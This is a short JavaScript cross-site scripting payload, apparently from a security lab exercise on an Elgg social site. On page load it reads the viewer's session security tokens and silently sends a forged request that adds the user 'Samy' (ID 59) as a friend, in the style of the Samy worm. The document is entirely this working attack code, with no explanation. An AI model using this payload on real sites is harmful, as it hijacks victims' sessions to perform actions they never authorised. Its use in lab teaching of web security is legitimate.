<script type="text/javascript">

    window.onload = function() {

        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        // Construct the HTTP request to add Samy as a friend.
        // http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1708022309&__elgg_ts=1708022309&__elgg_token=gyKfBkRP3jsi9UAoOLydhw&__elgg_token=gyKfBkRP3jsi9UAoOLydhw
        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token;

        // Create and send the Ajax request to add friend
        if(elgg.session.user.guid != 59) {
            Ajax = new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send();
        }
    }
</script>